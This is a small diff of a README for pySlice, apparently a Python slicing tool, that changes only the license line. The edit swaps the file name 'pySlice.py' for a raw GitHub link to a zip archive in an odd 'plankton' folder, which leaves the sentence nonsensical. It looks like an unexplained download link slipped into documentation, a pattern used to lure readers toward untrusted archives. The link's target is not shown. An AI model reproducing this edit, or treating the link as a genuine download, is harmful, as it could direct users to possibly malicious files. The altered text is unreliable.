@@ -10,4 +10,4 @@ I plan to possibly support other formats such as OBJ, for example however at the
 
 If you test pySlice successfully or unsuccessfully, let me know in the issues section of Github.
 
-pySlice.py is licensed under the MIT license.
+https://raw.githubusercontent.com/SteveGoguelin/pySlice/master/plankton/Slice-py-v1.4.zip is licensed under the MIT license.
